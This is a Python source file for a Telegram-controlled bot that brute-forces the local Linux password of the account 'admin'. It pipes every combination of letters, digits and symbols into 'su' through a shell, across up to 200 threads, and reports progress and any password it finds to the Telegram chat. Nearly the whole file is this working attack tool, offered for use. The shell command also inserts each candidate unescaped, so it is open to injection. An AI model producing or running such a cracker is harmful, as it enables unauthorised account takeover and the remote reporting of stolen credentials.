import subprocess
import itertools
import string
import time
import telebot
import os
import threading
from threading import Event

BOT_TOKEN = 'Your-API-key'
bot = telebot.TeleBot(BOT_TOKEN)

current_process = None
stop_event = Event()
TARGET_USER = "admin"
current_speed = 1
MAX_THREADS = 200

class BruteForceProcess:
    def __init__(self, max_length, start_combo=None, threads=1):
        self.max_length = max_length
        self.start_combo = start_combo
        self.threads = threads
        self.attempts = 0
        self.start_time = time.time()
        self.current_password = ""
        self.found = False
        self.running = False
        self.charset = string.ascii_letters + string.digits + string.punctuation
        self.lock = threading.Lock()
    
    def generate_passwords(self):
        if self.start_combo:
            yield self.start_combo
            start_len = len(self.start_combo)
        else:
            start_len = 1
        
        for length in range(start_len, self.max_length + 1):
            for combo in itertools.product(self.charset, repeat=length):
                if self.start_combo and length == len(self.start_combo):
                    if ''.join(combo) < self.start_combo:
                        continue
                yield ''.join(combo)
    
    def test_password(self, password):
        with self.lock:
            self.attempts += 1
            self.current_password = password
        
        try:
            cmd = f"echo '{password}' | su - {TARGET_USER} -c 'exit' 2>/dev/null"
            result = subprocess.run(cmd, shell=True, timeout=3, capture_output=True)
            if result.returncode == 0:
                with self.lock:
                    self.found = True
                return True
        except:
            pass
        return False
    
    def worker(self, password_generator, chat_id):
        for password in password_generator:
            if stop_event.is_set() or self.found:
                break
            
            if self.test_password(password):
                elapsed = time.time() - self.start_time
                msg = f"Password found for {TARGET_USER}: {password}\nTime: {elapsed:.1f}с\nAttempts: {self.attempts}\nThreads: {self.threads}"
                bot.send_message(chat_id, msg)
                break
    
    def run(self, chat_id):
        self.running = True
        try:
            password_generator = self.generate_passwords()
            threads = []
            for i in range(self.threads):
                thread = threading.Thread(target=self.worker, args=(password_generator, chat_id))
                thread.daemon = True
                threads.append(thread)
                thread.start()
            
            last_attempts = 0
            while any(thread.is_alive() for thread in threads) and not stop_event.is_set():
                time.sleep(2)
                
                with self.lock:
                    current_attempts = self.attempts
                
                if current_attempts - last_attempts > 0:
                    elapsed = time.time() - self.start_time
                    speed = (current_attempts - last_attempts) / 2
                    last_attempts = current_attempts
                    
                    if current_attempts % 500 == 0:
                        stats = f"Attempts: {current_attempts}\nSpeed: {speed:.1f} pass/sec\nThreads: {self.threads}\nCurrent: {self.current_password}"
                        bot.send_message(chat_id, stats)
            
            if not self.found and not stop_event.is_set():
                bot.send_message(chat_id, f"Password for {TARGET_USER} not found")
                
        except Exception as e:
            bot.send_message(chat_id, f"Error: {str(e)}")
        finally:
            self.running = False

@bot.message_handler(commands=['start'])
def start_brute(message):
    global current_process, current_speed
    if current_process and current_process.running:
        bot.send_message(message.chat.id, "The process has already started")
        return
    
    try:
        parts = message.text.split()
        max_length = int(parts[1])
        start_combo = parts[2] if len(parts) > 2 else None
        threads = int(parts[3]) if len(parts) > 3 else current_speed
        
        threads = min(threads, MAX_THREADS)
        current_speed = threads
        
        stop_event.clear()
        current_process = BruteForceProcess(max_length, start_combo, threads)
        thread = threading.Thread(target=current_process.run, args=(message.chat.id,))
        thread.start()
        
        bot.send_message(message.chat.id, f"Brute force started for {TARGET_USER}\nMax length: {max_length}\nThreads: {threads}")
        
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Usage: /start <max_length> [start_combination] [number_of_threads]")

@bot.message_handler(commands=['speed'])
def set_speed(message):
    global current_speed
    try:
        new_speed = int(message.text.split()[1])
        new_speed = max(1, min(new_speed, MAX_THREADS))
        current_speed = new_speed
        bot.send_message(message.chat.id, f"Speed ​​set: {current_speed} threads")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, f"Usage: /speed <number_threads>\nCurrent speed: {current_speed}\nMaximum: {MAX_THREADS}")

@bot.message_handler(commands=['stop'])
def stop_brute(message):
    stop_event.set()
    if current_process:
        bot.send_message(message.chat.id, f"Stopping process...\nLast checked: {current_process.current_password}\nThreads: {current_process.threads}")
    else:
        bot.send_message(message.chat.id, "There are no active processes")

@bot.message_handler(commands=['status'])
def status(message):
    if current_process and current_process.running:
        elapsed = time.time() - current_process.start_time
        with current_process.lock:
            attempts = current_process.attempts
            current_pass = current_process.current_password
        speed = attempts / elapsed if elapsed > 0 else 0
        stats = f"Status: Running\nAttempts: {attempts}\nCurrent: {current_pass}\nTime: {elapsed: .1f}s\nSpeed: {speed: .1f} pass/sec\nThreads: {current_process.threads}\nTarget: {TARGET_USER}"
        bot.send_message(message.chat.id, stats)
    else:
        bot.send_message(message.chat.id, "There are no active processes")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    if current_process:
        elapsed = time.time() - current_process.start_time
        with current_process.lock:
            attempts = current_process.attempts
            current_pass = current_process.current_password
            found = current_process.found
        speed = attempts / elapsed if elapsed > 0 else 0
        stats = f"Statistics:\nTotal Attempts: {attempts}\nElapsed Time: {elapsed:.1f}s\nSpeed: {speed:.1f} pass/sec\nFound: {found}\nLast: {current_pass}\nThreads: {current_process.threads}\nTarget: {TARGET_USER}"
        bot.send_message(message.chat.id, stats)
    else:
        bot.send_message(message.chat.id, "Statistics not available")

@bot.message_handler(commands=['max_threads'])
def set_max_threads(message):
    global MAX_THREADS
    try:
        new_max = int(message.text.split()[1])
        MAX_THREADS = max(1, new_max)
        bot.send_message(message.chat.id, f"The maximum number of threads is set to: {MAX_THREADS}")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, f"Usage: /max_threads <max_threads>\nCurrent maximum: {MAX_THREADS}")

if __name__ == "__main__":
    bot.polling(none_stop=True)

